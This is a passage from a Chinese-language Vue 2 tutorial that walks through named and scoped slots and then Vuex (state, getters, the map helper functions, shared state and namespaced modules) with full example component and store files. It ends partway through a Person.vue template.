#### 2.22.2 具名插槽

src\main.js

```js
//引入Vue
import Vue from 'vue'
//引入App
import App from './App.vue'
//关闭Vue的生产提示
Vue.config.productionTip = false

//创建vm
new Vue({
	el:'#app',
	render: h => h(App),
	//创建事件总线
	beforeCreate() {
		Vue.prototype.$bus = this
	}
})
```

src\App.vue

```vue
<template>
  <div  class="container">
    <Category title="美食">
      <img slot="center" src="https://s3.ax1x.com/2021/01/16/srJlq0.jpg" />
      <a slot="footer" href="https://s3.ax1x.com/2021/01/16/srJlq0.jpg">更多美食</a>
    </Category>

    <Category title="游戏">
      <ul slot="center">
        <li v-for="(g, index) in games" :key="index">{{ g }}</li>
      </ul>
      <div class="foot" slot="footer">
          <a href="https://s3.ax1x.com/2021/01/16/srJlq0.jpg">单机游戏</a>
          <a href="https://s3.ax1x.com/2021/01/16/srJlq0.jpg">网络游戏</a>
      </div>
    </Category>

    <Category title="电影">
      <video
        slot="center"
        controls
        src="https://vdept3.bdstatic.com/mda-rbahmp4f4z4sdxc8/cae_h264/1739278704766346239/mda-rbahmp4f4z4sdxc8.mp4?v_from_s=hkapp-haokan-nanjing&auth_key=1739291096-0-0-63c487c7778033283310fe6c25c0e288&bcevod_channel=searchbox_feed&pd=1&cr=0&cd=0&pt=3&logid=1496735763&vid=6626823136837992546&klogid=1496735763&abtest=132219_1"
      ></video>
    <template v-slot:footer>
        <div class="foot">
            <a href="https://s3.ax1x.com/2021/01/16/srJlq0.jpg">经典</a>
            <a href="https://s3.ax1x.com/2021/01/16/srJlq0.jpg">动作</a>
            <a href="https://s3.ax1x.com/2021/01/16/srJlq0.jpg">爱情</a>
        </div>
        <h4>欢迎前来观看</h4>
    </template>

    </Category>
  </div>
</template>

<script>
import axios from "axios";
import Category from "./components/Category";

export default {
  name: "App",
  components: { Category },
  data() {
    return {
      foods: ["火锅", "烧烤", "小龙虾", "牛排"],
      games: ["红色警戒", "穿越火线", "劲舞团", "超级玛丽"],
      films: ["《变形金钢》", "《拆弹专家》", "《战狼》", "《哪吒》"],
    };
  },
};
</script>

<style scoped>
	.container,.foot {
		display: flex;
		justify-content: space-around;
	}
</style>
```

src\components\Category.vue

```vue
<template>
<div class="category">
  <h3>{{title}}</h3>
  <!-- 定义一个插槽，等着组件的使用进行填充 -->
  <slot name="center">插槽默认值,没有为插槽指定数据时，此将显示</slot>
  <slot name="footer">插槽默认值,没有为插槽指定数据时，此将显示</slot>
</div>
</template>

<script>
export default {
  name: "Category",
  props:["title"]
};
</script>

<style scoped>
	.category{
		background-color: skyblue;
		width: 200px;
		height: 300px;
	}
	h3{
		text-align: center;
		background-color: orange;
	}
	video{
		width: 100%;
	}
	img{
		width: 100%;
	}
</style>
```

启动服务

![image-20250211214409614](.\images\image-20250211214409614.png)



#### 2.22.3 作用域插槽

src\main.js

```js
//引入Vue
import Vue from 'vue'
//引入App
import App from './App.vue'
//关闭Vue的生产提示
Vue.config.productionTip = false

//创建vm
new Vue({
	el:'#app',
	render: h => h(App),
	//创建事件总线
	beforeCreate() {
		Vue.prototype.$bus = this
	}
})
```

src\App.vue

```vue
<template>
  <div class="container">
    <Category title="游戏">
      <template scope="data">
        <ul>
          <li v-for="(g, index) in data.games" :key="index">{{ g }}</li>
        </ul>
        <h3>{{ data.msg }}</h3>
      </template>
    </Category>

    <Category title="游戏">
      <template scope="{games}">
        <ol>
          <li style="color: red" v-for="(g, index) in games" :key="index">{{ g }}</li>
        </ol>
      </template>
    </Category>

    <Category title="游戏">
      <template slot-scope="{ games }">
        <h4 v-for="(g, index) in games" :key="index">{{ g }}</h4>
      </template>
    </Category>
  </div>
</template>

<script>
import axios from "axios";
import Category from "./components/Category";

export default {
  name: "App",
  components: { Category },
};
</script>

<style scoped>
.container,
.foot {
  display: flex;
  justify-content: space-around;
}
</style>
```

src\components\Category.vue

```vue
<template>
  <div class="category">
    <h3>{{ title }}</h3>
    <!-- 通过子组件向父组件App传递内容 -->
    <slot :games="games" msg="hello22">插槽默认值,没有为插槽指定数据时，此将显示</slot>
  </div>
</template>

<script>
export default {
  name: "Category",
  props: ["title"],
  data() {
    return {
      games: ["和平精英", "穿越火线", "魔兽世界", "CS"],
    };
  },
};
</script>

<style scoped>
.category {
  background-color: skyblue;
  width: 200px;
  height: 300px;
}
h3 {
  text-align: center;
  background-color: orange;
}
video {
  width: 100%;
}
img {
  width: 100%;
}
</style>

```

启动服务

![image-20250211220020762](.\images\image-20250211220020762.png)

#### 总结

1. 作用：让父组件可以向子组件指定位置插入html结构，也是一种组件间通信的方式，适用于 <strong style="color:red">父组件 ===> 子组件</strong> 。

2. 分类：默认插槽、具名插槽、作用域插槽

3. 使用方式：

   1. 默认插槽：

      ```vue
      父组件中：
              <Category>
                 <div>html结构1</div>
              </Category>
      子组件中：
              <template>
                  <div>
                     <!-- 定义插槽 -->
                     <slot>插槽默认内容...</slot>
                  </div>
              </template>
      ```

   2. 具名插槽：

      ```vue
      父组件中：
              <Category>
                  <template slot="center">
                    <div>html结构1</div>
                  </template>
      
                  <template v-slot:footer>
                     <div>html结构2</div>
                  </template>
              </Category>
      子组件中：
              <template>
                  <div>
                     <!-- 定义插槽 -->
                     <slot name="center">插槽默认内容...</slot>
                     <slot name="footer">插槽默认内容...</slot>
                  </div>
              </template>
      ```

   3. 作用域插槽：

      1. 理解：<span style="color:red">数据在组件的自身，但根据数据生成的结构需要组件的使用者来决定。</span>（games数据在Category组件中，但使用数据所遍历出来的结构由App组件决定）

      2. 具体编码：

         ```vue
         父组件中：
         		<Category>
         			<template scope="scopeData">
         				<!-- 生成的是ul列表 -->
         				<ul>
         					<li v-for="g in scopeData.games" :key="g">{{g}}</li>
         				</ul>
         			</template>
         		</Category>
         
         		<Category>
         			<template slot-scope="scopeData">
         				<!-- 生成的是h4标题 -->
         				<h4 v-for="g in scopeData.games" :key="g">{{g}}</h4>
         			</template>
         		</Category>
         子组件中：
                 <template>
                     <div>
                         <slot :games="games"></slot>
                     </div>
                 </template>
         		
                 <script>
                     export default {
                         name:'Category',
                         props:['title'],
                         //数据在子组件自身
                         data() {
                             return {
                                 games:['红色警戒','穿越火线','劲舞团','超级玛丽']
                             }
                         },
                     }
                 </script>
         ```

   

## 3 vuex



![vuex](.\images\vuex.png)

### 3.1 vue求和使用vue实现

src\main.js

```js
//引入Vue
import Vue from 'vue'
//引入App
import App from './App.vue'
//关闭Vue的生产提示
Vue.config.productionTip = false

//创建vm
new Vue({
	el:'#app',
	render: h => h(App),
	//创建事件总线
	beforeCreate() {
		Vue.prototype.$bus = this
	}
})
```

src\App.vue

```vue
<template>
  <div>
    <Count />
  </div>
</template>

<script>
import Count from "./components/Count";

export default {
  name: "App",
  components: { Count },
};
</script>

```

src\components\Count.vue

```vue
<template>
  <div>
    <h1>{{ sum }}</h1>
    <select v-model.number="n">
      <option value="1">1</option>
      <option value="2">2</option>
      <option value="3">3</option>
    </select>
    <button @click="increment">+</button>
    <button @click="decrement">-</button>
    <button @click="incrementOdd">当前求和为奇数再加</button>
    <button @click="incrementWait">等一等再加</button>
  </div>
</template>

<script>
export default {
  name: 'Count',
  data() {
    return {
      //用户选择的数字
      n: 1,
      //求和
      sum: 0
    }
  },
  methods: {
    increment() {
      this.sum += this.n;
    },
    decrement() {
      this.sum -= this.n;
    },
    incrementOdd() {
      if (this.sum % 2 !== 0) {
        this.sum += this.n;
      }
    },
    incrementWait() {
      setTimeout(() => {
        this.sum += this.n;
      }, 500);
    },
  },
};
</script>

<style lang="css">
button {
  margin-left: 5px;
}
</style>
```

启动服务

```sh
npm run serve
```

![image-20250212123924533](.\images\image-20250212123924533.png)

### 3.2 使用Vuex改写求和案例

```sh
# 安装vuex
npm i vuex@3
```

src\main.js

```js
//引入Vue
import Vue from 'vue'
//引入App
import App from './App.vue'
//引入store,src/store/index.js,默认文件是这个，名称相同时，便可不写
import store from './store'

//关闭Vue的生产提示
Vue.config.productionTip = false

//创建vm
new Vue({
	el:'#app',
	render: h => h(App),
	store:store,
	//创建事件总线
	beforeCreate() {
		Vue.prototype.$bus = this
	}
})
```

src\App.vue

```vue
<template>
  <div>
    <Count />
  </div>
</template>

<script>
import Count from "./components/Count";

export default {
  name: "App",
  components: { Count },
};
</script>

```

src\store\index.js

```js
//该文件创建Vuex中最核心的Store
import Vue from 'vue'
//引入vuex
import Vuex from 'vuex'
//应用Vuex插件
Vue.use(Vuex)

//准备actions-用于响应组件中的动作 
const actions = {
    increment(context, value) {
        console.log('actions中的increment被调用了')
        context.commit('INCREMENT', value);
    },
    incrementOdd(context, value) {
        if (context.state.sum % 2 !== 0) {
            context.commit('INCREMENT', value);
        }
    },
    incrementWait(context, value) {
        setTimeout(() => {
            context.commit('INCREMENT', value);
        }, 500);
    }
}

//准备mutations--用于操作数据 
const mutations = {
    INCREMENT(state, value) {
        console.log('mutations中的INCREMENT被调用了')
        state.sum += value;
    },
    DECREMENT(state, value) {
        state.sum -= value;
    }
}

//准备State--用于存储数据
const state = {
    sum: 0
}

//创建并暴露store
export default new Vuex.Store({
    actions:actions,
    mutations:mutations,
    state
})

```

src\components\Count.vue

```vue
<template>
  <div>
    <h1>{{ $store.state.sum }}</h1>
    <select v-model.number="n">
      <option value="1">1</option>
      <option value="2">2</option>
      <option value="3">3</option>
    </select>
    <button @click="increment">+</button>
    <button @click="decrement">-</button>
    <button @click="incrementOdd">当前求和为奇数再加</button>
    <button @click="incrementWait">等一等再加</button>
  </div>
</template>

<script>
export default {
  name: 'Count',
  data() {
    return {
      //用户选择的数字
      n: 1,
      //求和
      sum: 0
    }
  },
  methods: {
    increment() {
        this.$store.dispatch('increment',this.n);
    },
    decrement() {
      this.$store.commit('DECREMENT',this.n);
    },
    incrementOdd() {
      this.$store.dispatch('incrementOdd',this.n);
    },
    incrementWait() {
      this.$store.dispatch('incrementWait',this.n);
    },
  },
};
</script>

<style lang="css">
button {
  margin-left: 5px;
}
</style>
```

运行服务

![image-20250212144008974](.\images\image-20250212144008974.png)



### 3.3 getters的使用

src\main.js

```js
//引入Vue
import Vue from 'vue'
//引入App
import App from './App.vue'
//引入store,src/store/index.js,默认文件是这个，名称相同时，便可不写
import store from './store'

//关闭Vue的生产提示
Vue.config.productionTip = false

//创建vm
new Vue({
	el:'#app',
	render: h => h(App),
	store:store,
	//创建事件总线
	beforeCreate() {
		Vue.prototype.$bus = this
	}
})
```

src\App.vue

```vue
<template>
  <div>
    <Count />
  </div>
</template>

<script>
import Count from "./components/Count";

export default {
  name: "App",
  components: { Count },
};
</script>
```

src\store\index.js

```js
//该文件创建Vuex中最核心的Store
import Vue from 'vue'
//引入vuex
import Vuex from 'vuex'
//应用Vuex插件
Vue.use(Vuex)

//准备actions-用于响应组件中的动作 
const actions = {
    increment(context, value) {
        console.log('actions中的increment被调用了')
        context.commit('INCREMENT', value);
    },
    incrementOdd(context, value) {
        if (context.state.sum % 2 !== 0) {
            context.commit('INCREMENT', value);
        }
    },
    incrementWait(context, value) {
        setTimeout(() => {
            context.commit('INCREMENT', value);
        }, 500);
    }
}

//准备mutations--用于操作数据 
const mutations = {
    INCREMENT(state, value) {
        console.log('mutations中的INCREMENT被调用了')
        state.sum += value;
    },
    DECREMENT(state, value) {
        state.sum -= value;
    }
}

//准备State--用于存储数据
const state = {
    sum: 0
}

//准备Getters-用于将state中的数据进行加工
const getters = {
    bigSum(state){
        return state.sum * 10
    }
}

//创建并暴露store
export default new Vuex.Store({
    actions:actions,
    mutations:mutations,
    state,
    getters
})
```

src\components\Count.vue

```vue
<template>
  <div>
    <h1>当前的数据求和为：{{ $store.state.sum }}</h1>
    <h1>当前求和放大10倍为:{{ $store.getters.bigSum}}</h1>
    <select v-model.number="n">
      <option value="1">1</option>
      <option value="2">2</option>
      <option value="3">3</option>
    </select>
    <button @click="increment">+</button>
    <button @click="decrement">-</button>
    <button @click="incrementOdd">当前求和为奇数再加</button>
    <button @click="incrementWait">等一等再加</button>
  </div>
</template>

<script>
export default {
  name: 'Count',
  data() {
    return {
      //用户选择的数字
      n: 1,
      //求和
      sum: 0
    }
  },
  methods: {
    increment() {
        this.$store.dispatch('increment',this.n);
    },
    decrement() {
      this.$store.commit('DECREMENT',this.n);
    },
    incrementOdd() {
      this.$store.dispatch('incrementOdd',this.n);
    },
    incrementWait() {
      this.$store.dispatch('incrementWait',this.n);
    },
  },
};
</script>

<style lang="css">
button {
  margin-left: 5px;
}
</style>
```

启动服务检查

![image-20250212214435607](.\images\image-20250212214435607.png)

总结：getters的使用

1. 概念：当state中的数据需要经过加工后再使用时，可以使用getters加工。

2. 在```store.js```中追加```getters```配置

   ```js
   ......
   
   const getters = {
   	bigSum(state){
   		return state.sum * 10
   	}
   }
   
   //创建并暴露store
   export default new Vuex.Store({
   	......
   	getters
   })
   ```

3. 组件中读取数据：```$store.getters.bigSum```

### 3.4 mapState和mapGetters

src\main.js

```js
//引入Vue
import Vue from 'vue'
//引入App
import App from './App.vue'
//引入store,src/store/index.js,默认文件是这个，名称相同时，便可不写
import store from './store'

//关闭Vue的生产提示
Vue.config.productionTip = false

//创建vm
new Vue({
	el:'#app',
	render: h => h(App),
	store:store,
	//创建事件总线
	beforeCreate() {
		Vue.prototype.$bus = this
	}
})
```

src\App.vue

```vue
<template>
  <div>
    <Count />
  </div>
</template>

<script>
import Count from "./components/Count";

export default {
  name: "App",
  components: { Count },
};
</script>
```

src\store\index.js

```js
//该文件创建Vuex中最核心的Store
import Vue from 'vue'
//引入vuex
import Vuex from 'vuex'
//应用Vuex插件
Vue.use(Vuex)

//准备actions-用于响应组件中的动作 
const actions = {
    increment(context, value) {
        console.log('actions中的increment被调用了')
        context.commit('INCREMENT', value);
    },
    incrementOdd(context, value) {
        if (context.state.sum % 2 !== 0) {
            context.commit('INCREMENT', value);
        }
    },
    incrementWait(context, value) {
        setTimeout(() => {
            context.commit('INCREMENT', value);
        }, 500);
    }
}

//准备mutations--用于操作数据 
const mutations = {
    INCREMENT(state, value) {
        console.log('mutations中的INCREMENT被调用了')
        state.sum += value;
    },
    DECREMENT(state, value) {
        state.sum -= value;
    }
}

//准备State--用于存储数据
const state = {
    //求和
    sum: 0,
    school: '交大',
    subject: '计算机'
}

//准备Getters-用于将state中的数据进行加工
const getters = {
    bigSum(state) {
        return state.sum * 10
    }
}

//创建并暴露store
export default new Vuex.Store({
    actions: actions,
    mutations: mutations,
    state,
    getters
})
```

src\components\Count.vue

```vue
<template>
  <div>
    <h1>当前的数据求和为：{{ sum }}</h1>
    <h1>当前求和放大10倍为:{{ bigSum }}</h1>
    <h3>我在{{ school }},学习{{ subject }}</h3>
    <select v-model.number="n">
      <option value="1">1</option>
      <option value="2">2</option>
      <option value="3">3</option>
    </select>
    <button @click="increment">+</button>
    <button @click="decrement">-</button>
    <button @click="incrementOdd">当前求和为奇数再加</button>
    <button @click="incrementWait">等一等再加</button>
  </div>
</template>

<script>
import { mapState, mapGetters } from "vuex";
export default {
  name: "Count",
  data() {
    return {
      //用户选择的数字
      n: 1,
    };
  },
  //使用计算属性来展示
  computed: {
    /* sum() {
      return this.$store.state.sum;
    },
    school() {
      return this.$store.state.school;
    },
    subject() {
      return this.$store.state.subject;
    }, */

    //借助mapState生成计算属性，从state中读取数据（对象写法）
    // ...mapState({ sum: "sum", school: "school", subject: "subject" }),
    //借助mapState生成计算属性，从state中读取数据（数组写法）
    ...mapState(['sum','school','subject']),

    /*  
     bigSum() {
      return this.$store.getters.bigSum;
    }, */
    //借助mapGetters生成计算属性,从getters中读取数据。（对象写法）
    // ...mapGetters({ bigSum: "bigSum" }),
    //借助mapGetters生成计算属性,从getters中读取数据。（数组写法）
    ...mapGetters(['bigSum']),
  },
  methods: {
    increment() {
      this.$store.dispatch("increment", this.n);
    },
    decrement() {
      this.$store.commit("DECREMENT", this.n);
    },
    incrementOdd() {
      this.$store.dispatch("incrementOdd", this.n);
    },
    incrementWait() {
      this.$store.dispatch("incrementWait", this.n);
    },
  },
};
</script>

<style lang="css">
button {
  margin-left: 5px;
}
</style>
```

![image-20250212223621948](.\images\image-20250212223621948.png)



### 3.5 mapActions和mapMutations

src\main.js

```js
//引入Vue
import Vue from 'vue'
//引入App
import App from './App.vue'
//引入store,src/store/index.js,默认文件是这个，名称相同时，便可不写
import store from './store'

//关闭Vue的生产提示
Vue.config.productionTip = false

//创建vm
new Vue({
	el:'#app',
	render: h => h(App),
	store:store,
	//创建事件总线
	beforeCreate() {
		Vue.prototype.$bus = this
	}
})
```

src\App.vue

```vue
<template>
  <div>
    <Count />
  </div>
</template>

<script>
import Count from "./components/Count";

export default {
  name: "App",
  components: { Count },
};
</script>
```

src\store\index.js

```js
//该文件创建Vuex中最核心的Store
import Vue from 'vue'
//引入vuex
import Vuex from 'vuex'
//应用Vuex插件
Vue.use(Vuex)

//准备actions-用于响应组件中的动作 
const actions = {
    increment(context, value) {
        console.log('actions中的increment被调用了')
        context.commit('INCREMENT', value);
    },
    incrementOdd(context, value) {
        if (context.state.sum % 2 !== 0) {
            context.commit('INCREMENT', value);
        }
    },
    incrementWait(context, value) {
        setTimeout(() => {
            context.commit('INCREMENT', value);
        }, 500);
    }
}

//准备mutations--用于操作数据 
const mutations = {
    INCREMENT(state, value) {
        console.log('mutations中的INCREMENT被调用了')
        state.sum += value;
    },
    DECREMENT(state, value) {
        state.sum -= value;
    }
}

//准备State--用于存储数据
const state = {
    //求和
    sum: 0,
    school: '交大',
    subject: '计算机'
}

//准备Getters-用于将state中的数据进行加工
const getters = {
    bigSum(state) {
        return state.sum * 10
    }
}

//创建并暴露store
export default new Vuex.Store({
    actions: actions,
    mutations: mutations,
    state,
    getters
})
```

src\components\Count.vue

```vue
<template>
  <div>
    <h1>当前的数据求和为：{{ sum }}</h1>
    <h1>当前求和放大10倍为:{{ bigSum }}</h1>
    <h3>我在{{ school }},学习{{ subject }}</h3>
    <select v-model.number="n">
      <option value="1">1</option>
      <option value="2">2</option>
      <option value="3">3</option>
    </select>
    <button @click="INCREMENT(n)">+</button>
    <button @click="DECREMENT(n)">-</button>
    <button @click="incrementOdd(n)">当前求和为奇数再加</button>
    <button @click="incrementWait(n)">等一等再加</button>
  </div>
</template>

<script>
import { mapState, mapGetters, mapMutations, mapActions } from "vuex";
export default {
  name: "Count",
  data() {
    return {
      //用户选择的数字
      n: 1,
    };
  },
  //使用计算属性来展示
  computed: {
    /* sum() {
      return this.$store.state.sum;
    },
    school() {
      return this.$store.state.school;
    },
    subject() {
      return this.$store.state.subject;
    }, */

    //借助mapState生成计算属性，从state中读取数据（对象写法）
    // ...mapState({ sum: "sum", school: "school", subject: "subject" }),
    //借助mapState生成计算属性，从state中读取数据（数组写法）
    ...mapState(["sum", "school", "subject"]),

    /*
     bigSum() {
      return this.$store.getters.bigSum;
    }, */
    //借助mapGetters生成计算属性,从getters中读取数据。（对象写法）
    // ...mapGetters({ bigSum: "bigSum" }),
    //借助mapGetters生成计算属性,从getters中读取数据。（数组写法）
    ...mapGetters(["bigSum"]),
  },
  methods: {
    /* increment() {
      this.$store.commit("INCREMENT", this.n);
    },
    decrement() {
      this.$store.commit("DECREMENT", this.n);
     },
     */
    //借助mapMutaions生成对应的方法，方法中会调用commit去联系mutaions(对象写法),注意参数需要传递
    // ...mapMutations({ increment: "INCREMENT", decrement: "DECREMENT" }),
    //借助mapMutaions生成对应的方法，方法中会调用commit去联系mutaions(数组写法),此需要将调用方法改为INCREMENT和DECREMENT
    ...mapMutations(["INCREMENT", "DECREMENT"]),

    /* incrementOdd() {
      this.$store.dispatch("incrementOdd", this.n);
    },
    incrementWait() {
      this.$store.dispatch("incrementWait", this.n);
    }, */
    //借助mapActions生成对应的方法，方法中会调用dispatch去联系actions(对象写法)
    // ...mapActions({incrementOdd:'incrementOdd',incrementWait:'incrementWait'}),
    //借助mapActions生成对应的方法，方法中会调用dispatch去联系actions(数组写法)
    ...mapActions(["incrementOdd", "incrementWait"]),
  },
};
</script>

<style lang="css">
button {
  margin-left: 5px;
}
</style>

```

启动验证

![image-20250212223855201](.\images\image-20250212223855201.png)



总结：四个map方法的使用

1. <strong>mapState方法：</strong>用于帮助我们映射```state```中的数据为计算属性

   ```js
   computed: {
       //借助mapState生成计算属性：sum、school、subject（对象写法）
        ...mapState({sum:'sum',school:'school',subject:'subject'}),
            
       //借助mapState生成计算属性：sum、school、subject（数组写法）
       ...mapState(['sum','school','subject']),
   },
   ```

2. <strong>mapGetters方法：</strong>用于帮助我们映射```getters```中的数据为计算属性

   ```js
   computed: {
       //借助mapGetters生成计算属性：bigSum（对象写法）
       ...mapGetters({bigSum:'bigSum'}),
   
       //借助mapGetters生成计算属性：bigSum（数组写法）
       ...mapGetters(['bigSum'])
   },
   ```

3. <strong>mapActions方法：</strong>用于帮助我们生成与```actions```对话的方法，即：包含```$store.dispatch(xxx)```的函数

   ```js
   methods:{
       //靠mapActions生成：incrementOdd、incrementWait（对象形式）
       ...mapActions({incrementOdd:'jiaOdd',incrementWait:'jiaWait'})
   
       //靠mapActions生成：incrementOdd、incrementWait（数组形式）
       ...mapActions(['jiaOdd','jiaWait'])
   }
   ```

4. <strong>mapMutations方法：</strong>用于帮助我们生成与```mutations```对话的方法，即：包含```$store.commit(xxx)```的函数

   ```js
   methods:{
       //靠mapActions生成：increment、decrement（对象形式）
       ...mapMutations({increment:'JIA',decrement:'JIAN'}),
       
       //靠mapMutations生成：JIA、JIAN（对象形式）
       ...mapMutations(['JIA','JIAN']),
   }
   ```

> 备注：mapActions与mapMutations使用时，若需要传递参数需要：在模板中绑定事件时传递好参数，否则参数是事件对象。

### 3.6  组件共享

src\main.js

```js
//引入Vue
import Vue from 'vue'
//引入App
import App from './App.vue'
//引入store,src/store/index.js,默认文件是这个，名称相同时，便可不写
import store from './store'

//关闭Vue的生产提示
Vue.config.productionTip = false

//创建vm
new Vue({
	el:'#app',
	render: h => h(App),
	store:store,
	//创建事件总线
	beforeCreate() {
		Vue.prototype.$bus = this
	}
})
```

src\App.vue

```vue
<template>
  <div>
    <Count />
    <hr/>
    <Person/>
  </div>
</template>

<script>
import Count from "./components/Count";
import Person from "./components/Person";

export default {
  name: "App",
  components: { Count,Person },
};
</script>
```

src\store\index.js

```js
//该文件创建Vuex中最核心的Store
import Vue from 'vue'
//引入vuex
import Vuex from 'vuex'
//应用Vuex插件
Vue.use(Vuex)

//准备actions-用于响应组件中的动作 
const actions = {
    increment(context, value) {
        console.log('actions中的increment被调用了')
        context.commit('INCREMENT', value);
    },
    incrementOdd(context, value) {
        if (context.state.sum % 2 !== 0) {
            context.commit('INCREMENT', value);
        }
    },
    incrementWait(context, value) {
        setTimeout(() => {
            context.commit('INCREMENT', value);
        }, 500);
    }
}

//准备mutations--用于操作数据 
const mutations = {
    INCREMENT(state, value) {
        console.log('mutations中的INCREMENT被调用了')
        state.sum += value;
    },
    DECREMENT(state, value) {
        state.sum -= value;
    },
    ADD_PERSON(state,value){
        state.personList.unshift(value);
    }
}

//准备State--用于存储数据
const state = {
    //求和
    sum: 0,
    school: '交大',
    subject: '计算机',
    personList:[
        {id:'001',name:'nullnull'}
    ]
}

//准备Getters-用于将state中的数据进行加工
const getters = {
    bigSum(state) {
        return state.sum * 10
    }
}

//创建并暴露store
export default new Vuex.Store({
    actions: actions,
    mutations: mutations,
    state,
    getters
})

```

src\components\Count.vue

```vue
<template>
  <div>
    <h1>当前的数据求和为：{{ sum }}</h1>
    <h1>当前求和放大10倍为:{{ bigSum }}</h1>
    <h3>我在{{ school }},学习{{ subject }}</h3>
    <h3 style="color: red">Person组件的总人数是:{{ personList.length }}</h3>
    <select v-model.number="n">
      <option value="1">1</option>
      <option value="2">2</option>
      <option value="3">3</option>
    </select>
    <button @click="increment(n)">+</button>
    <button @click="decrement(n)">-</button>
    <button @click="incrementOdd(n)">当前求和为奇数再加</button>
    <button @click="incrementWait(n)">等一等再加</button>
  </div>
</template>

<script>
import { mapState, mapGetters, mapMutations, mapActions } from "vuex";
export default {
  name: "Count",
  data() {
    return {
      //用户选择的数字
      n: 1,
    };
  },
  //使用计算属性来展示
  computed: {
    //借助mapState生成计算属性，从state中读取数据（数组写法）
    ...mapState(["sum", "school", "subject", "personList"]),
    //借助mapGetters生成计算属性,从getters中读取数据。（数组写法）
    ...mapGetters(["bigSum"]),
  },
  methods: {
    //借助mapMutaions生成对应的方法，方法中会调用commit去联系mutaions(对象写法),注意参数需要传递
    ...mapMutations({ increment: "INCREMENT", decrement: "DECREMENT" }),

    //借助mapActions生成对应的方法，方法中会调用dispatch去联系actions(对象写法)
    ...mapActions({ incrementOdd: "incrementOdd", incrementWait: "incrementWait" }),
  },
};
</script>

<style lang="css">
button {
  margin-left: 5px;
}
</style>
```

src\components\Person.vue

```vue
<template>
  <div>
        <h1>人员列表</h1>
        <h3 style="color:red">组件的求和为:{{sum}}</h3>
        <input type="text" placeholder="请输入名称" v-model="name" />
        <button @click="add">添加</button>
        <ul>
            <li v-for="p in personList" :key="p.id">{{p.name}}</li>
        </ul>
  </div>
</template>

<script>
import {nanoid} from 'nanoid'
export default {
    name: 'Person',
    data(){
        return {
            name:''
        }
    },
    computed:{
        personList(){
            return this.$store.state.personList;
        },
        sum(){
            return this.$store.state.sum;
        }
    },
    methods:{
        add(){
            const personObj = {id:nanoid(),name:this.name}
            console.log('user',personObj);
            this.$store.commit('ADD_PERSON',personObj);
            this.name = ''
        }
    }
}
</script>

<style>

</style>
```

效果

![image-20250212225848568](.\images\image-20250212225848568.png)



### 3.7 vuex模块化

src\main.js

```js
//引入Vue
import Vue from 'vue'
//引入App
import App from './App.vue'
//引入store,src/store/index.js,默认文件是这个，名称相同时，便可不写
import store from './store'

//关闭Vue的生产提示
Vue.config.productionTip = false

//创建vm
new Vue({
	el:'#app',
	render: h => h(App),
	store:store,
	//创建事件总线
	beforeCreate() {
		Vue.prototype.$bus = this
	}
})
```

src\App.vue

```vue
<template>
  <div>
    <Count />
    <hr/>
    <Person/>
  </div>
</template>

<script>
import Count from "./components/Count";
import Person from "./components/Person";

export default {
  name: "App",
  components: { Count,Person },
};
</script>

```

src\store\count.js

```js
export default {
    namespaced:true,
    actions: {
        increment(context, value) {
            console.log('actions中的increment被调用了')
            context.commit('INCREMENT', value);
        },
        incrementOdd(context, value) {
            if (context.state.sum % 2 !== 0) {
                context.commit('INCREMENT', value);
            }
        },
        incrementWait(context, value) {
            setTimeout(() => {
                context.commit('INCREMENT', value);
            }, 500);
        }
    },
    mutations: {
        INCREMENT(state, value) {
            console.log('mutations中的INCREMENT被调用了')
            state.sum += value;
        },
        DECREMENT(state, value) {
            state.sum -= value;
        },
    },
    state: {
        sum: 0,
        school: '交大',
        subject: '计算机',
    },
    getters: {
        bigSum(state) {
            return state.sum * 10
        }
    }
}
```

src\store\person.js

```js
import axios from 'axios'
import { nanoid } from 'nanoid'

export default {
    //此为必须
    namespaced: true,
    actions: {
        addPersonWang(context, value) {
            if (value.name.indexOf('刘') === 0) {
                context.commit('ADD_PERSON', value);
            }
            else {
                alert('添加的人须姓刘');
            }
        },
        addPersionServer(context) {
            axios.get('https://luckycola.com.cn/tools/randomStr?ColaKey=yKZpIa0Eu5nZp01739458376604gCoBaEkvfo').then(
                response => {
                    console.log(response)
                    context.commit('ADD_PERSON', { id: nanoid(), name: response.data.data.str })
                }, error => {
                    alert(error.message);
                }
            )
        }
    },
    mutations: {
        ADD_PERSON(state, value) {
            state.personList.unshift(value);
        }
    },
    state: {
        personList: [
            { id: '001', name: 'nullnull' }
        ]
    },
    getters: {
        firstPersonName(state) {
            return state.personList[0].name;
        }
    }
}
```

src\store\index.js

```js
//该文件创建Vuex中最核心的Store
import Vue from 'vue'
//引入vuex
import Vuex from 'vuex'

import countOptions from './count'
import personOption from './person'

//应用Vuex插件
Vue.use(Vuex)

//创建并暴露store
export default new Vuex.Store({
    modules:{
        countAbout: countOptions,
        personAbout: personOption
    }
})

```

src\components\Count.vue

```vue
<template>
  <div>
    <h1>当前的数据求和为：{{ sum }}</h1>
    <h1>当前求和放大10倍为:{{ bigSum }}</h1>
    <h3>我在{{ school }},学习{{ subject }}</h3>
    <h3 style="color: red">Person组件的总人数是:{{ personList.length }}</h3>
    <select v-model.number="n">
      <option value="1">1</option>
      <option value="2">2</option>
      <option value="3">3</option>
    </select>
    <button @click="increment(n)">+</button>
    <button @click="decrement(n)">-</button>
    <button @click="incrementOdd(n)">当前求和为奇数再加</button>
    <button @click="incrementWait(n)">等一等再加</button>
  </div>
</template>

<script>
import { mapState, mapGetters, mapMutations, mapActions } from "vuex";
export default {
  name: "Count",
  data() {
    return {
      //用户选择的数字
      n: 1,
    };
  },
  //使用计算属性来展示
  computed: {
    //借助mapState生成计算属性，从state中读取数据（数组写法）
    ...mapState('countAbout',["sum", "school", "subject"]),
    ...mapState('personAbout',["personList"]),
    //借助mapGetters生成计算属性,从getters中读取数据。（数组写法）
    ...mapGetters('countAbout',["bigSum"]),
  },
  methods: {
    //借助mapMutaions生成对应的方法，方法中会调用commit去联系mutaions(对象写法),注意参数需要传递
    ...mapMutations('countAbout',{ increment: "INCREMENT", decrement: "DECREMENT" }),

    //借助mapActions生成对应的方法，方法中会调用dispatch去联系actions(对象写法)
    ...mapActions('countAbout',{ incrementOdd: "incrementOdd", incrementWait: "incrementWait" }),
  },
};
</script>

<style lang="css">
button {
  margin-left: 5px;
}
</style>
```

src\components\Person.vue

```vue
<template>
  <div>
        <h1>人员列表</h1>
        <h3 style="color:red">组件的求和为:{{sum}}</h3>
        <h3>列表中第一个人的名字是：{{firstPersonName}}</h3>
        <input type="text" placeholder="请输入名称" v-model="name" />
        <button @click="add">添加</button>
        <button @click="addWang">添加一个姓刘的人</button>
        <button @click="addPersonServer">添加一个远程的空空</button>
        <ul>
